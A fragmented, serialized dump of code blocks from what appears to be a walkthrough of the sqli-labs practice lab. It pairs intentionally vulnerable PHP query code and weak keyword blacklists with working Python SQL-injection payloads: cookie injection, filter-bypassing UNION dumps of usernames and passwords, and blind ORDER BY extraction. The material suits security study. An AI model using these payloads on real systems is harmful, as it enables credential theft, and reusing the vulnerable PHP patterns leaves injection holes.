payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-21"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
1f:T4f8,<span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$cookee</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$cookee1</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
20:T5be,payload <span class="token operator">=</span> <span class="token string">'x" OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #'</span>
payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-22"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
21:T7fd,<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span>
<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span>
<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
22:T9f1,<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$curr_pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$re_pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET password='<span class="token interpolation"><span class="token variable">$pass</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' AND password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
23:T1454,<span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// strip out OR (non case sensitive)</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out AND (non case sensitive)</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out --</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// Strip out #</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out spaces</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out slashes</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
24:T1a9e,<span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Strip out --.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out #.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Strip out spaces.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out union</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out select</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out UNION</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out SELECT</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out Union</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out select</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
25:T443,payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"UNION"</span><span class="token punctuation">,</span> <span class="token string">"UNiON"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"SEleCT"</span><span class="token punctuation">)</span>
26:T443,payload <span class="token operator">=</span> <span class="token string">'?id=x" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE "1"="1'</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"UNION"</span><span class="token punctuation">,</span> <span class="token string">"UNiON"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"SEleCT"</span><span class="token punctuation">)</span>
27:T1010,<span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//Strip out --.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//Strip out #.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//Strip out spaces.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Strip out UNION &amp; SELECT.</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=('<span class="token interpolation"><span class="token variable">$id</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>
28:T19bc,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// WAF implementation with a whitelist approach, only allows input to be numeric.</span>
<span class="token keyword">function</span> <span class="token function-definition function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\d+$/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// ... input is valid</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// ... input is invalid</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacked.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span>
<span class="token keyword">function</span> <span class="token function-definition function">java_implementation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>
    <span class="token variable">$qs_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$val</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$id_value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// ...</span>

<span class="token variable">$qs</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id1</span> <span class="token operator">=</span> <span class="token function">java_implementation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
29:T118a,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mysqli_report</span><span class="token punctuation">(</span><span class="token class-name">MYSQLI_REPORT_ERROR</span> <span class="token operator">|</span> <span class="token class-name">MYSQLI_REPORT_STRICT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT CURRENT_USER();"</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"SELECT Name FROM City ORDER BY ID LIMIT 20, 5"</span><span class="token punctuation">;</span>

<span class="token comment">/* execute multi query */</span>
<span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">do</span> <span class="token punctuation">{</span>
    <span class="token comment">/* store the result set in PHP */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s\n"</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/* print divider */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_more_results</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"-----------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
2a:T5ff,<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">-- 2</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- </span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> username<span class="token punctuation">;</span> <span class="token comment">-- </span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> username <span class="token keyword">ASC</span><span class="token punctuation">,</span> id <span class="token keyword">DESC</span><span class="token punctuation">;</span> <span class="token comment">-- ID</span>
2b:Taf4,payload <span class="token operator">=</span> <span class="token string">"?sort=rand(substr(database(),1,1)='!') -- "</span>
resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-48"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
hash_false <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-48"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    hash_resp <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> hash_resp <span class="token operator">!=</span> hash_false<span class="token punctuation">)</span>


test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),1,1)='?') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># False</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),1,1)='s') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),2,1)='e') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),3,1)='c') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
2c:Tb5d,payload <span class="token operator">=</span> <span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='!') -- "</span>
resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-49"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
hash_false <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-49"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    hash_resp <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> hash_resp <span class="token operator">!=</span> hash_false<span class="token punctuation">)</span>


test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='?') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># False</span>
